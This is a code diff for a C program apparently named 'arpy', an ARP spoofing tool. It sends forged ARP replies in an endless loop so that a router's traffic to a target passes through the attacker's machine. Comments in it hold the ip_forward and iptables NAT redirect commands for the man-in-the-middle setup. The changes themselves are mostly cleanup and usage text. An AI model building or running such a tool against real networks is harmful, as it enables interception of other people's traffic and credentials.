@@ -1,10 +1,11 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
-#include <unistd.h> // getopt
 #include <string.h>
-#include <errno.h>
 
+#include <errno.h>
+#include <time.h>
+
+#include <unistd.h> //getopt
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -13,10 +14,9 @@
 #include <net/ethernet.h>
 #include <netpacket/packet.h>
 
-//# echo 1 > /proc/sys/net/ipv4/ip_forward
 
 /* 
-sudo ip link set dev wlan0 arp off
+sudo ip link set dev wlan0 arp 
 
 
 sudo sysctl -w net.ipv4.ip_forward=1
@@ -46,12 +46,10 @@ sudo iptables -t nat -D PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 80
     sudo iptables --delete-chain
 */
 
-void print_usage() {
-    printf("Usage: -i <device> -r <router's ip> -t <target's ip> \n");
-}
+void print_usage();
 
 int main (int argc, char **argv){
-  /* GETOPT SETUP *?
+  /* GETOPT SETUP */
     /* FLAGS */
     int sflag = 0; //<-- silent mode - no output
     int vflag = 0; //<-- verbose mode - extra output
@@ -61,8 +59,6 @@ int main (int argc, char **argv){
     unsigned char  target_mac[6];
     unsigned char  router_mac[6];
     char *device = NULL;
-  /* Constants */
-  const unsigned char ether_broadcast_addr[]={0xff,0xff,0xff,0xff,0xff,0xff}; //<-- Broadcast address
 
   int c; //<-- counter
   int sd; //<-- socket descripton
@@ -74,7 +70,6 @@ int main (int argc, char **argv){
   struct ether_arp target_arpreply;
   struct ether_arp router_arpreply;
   struct timespec t = { 1/*seconds*/, 0/*nanoseconds*/};    
-  char ch;
  
   while ((c = getopt(argc, argv, "sd:t:r:T:R:")) != -1){
     switch (c){
@@ -90,7 +85,7 @@ int main (int argc, char **argv){
       case 'R':
         printf("router %s\n", optarg);
         sscanf(optarg, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &router_mac[0], &router_mac[1], &router_mac[2], &router_mac[3], &router_mac[4], &router_mac[5]);
-        puts(router_mac);
+        //puts(router_mac);
         break;
       case 't':
         target_ip = optarg;
@@ -98,7 +93,7 @@ int main (int argc, char **argv){
       case 'T':
         printf("target %s\n", optarg);
         sscanf(optarg, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
-        puts(target_mac);
+        //puts(target_mac);
         break;
       case 'd':
         device = optarg;
@@ -109,6 +104,12 @@ int main (int argc, char **argv){
     }
   }
 
+  sflag = 2; //temps to surpress warnings about unused variables
+  vflag = 2;
+  if (vflag || sflag)
+  {
+    /* code */
+  }
   if (router_ip == NULL || target_ip == NULL || router_mac == NULL || target_mac == NULL || device == NULL ) {
     print_usage();
     exit(EXIT_FAILURE);
@@ -190,13 +191,7 @@ int main (int argc, char **argv){
   memcpy(&router_arpreply.arp_spa,&target_ip_addr.s_addr,sizeof(router_arpreply.arp_spa));
   memcpy(&router_arpreply.arp_sha,&device_mac,sizeof(router_arpreply.arp_sha));
 
-
-  
-
   int num_arp_sent= 0;
-  
-
-
 
   while (1){
     if (sendto(sd,&router_arpreply,sizeof(router_arpreply),0,(struct sockaddr*)&raddr,sizeof(raddr))==-1) {
@@ -217,6 +212,10 @@ int main (int argc, char **argv){
   }
   close(sd);
   return 0;
+}
+
+void print_usage() {
+    printf("arpy\t-d <networking device>\n\t-t <target IP> -T <target MAC>\n\t-r <router IP> -R <router MAC>\n");
 }
 
 /* srcs:
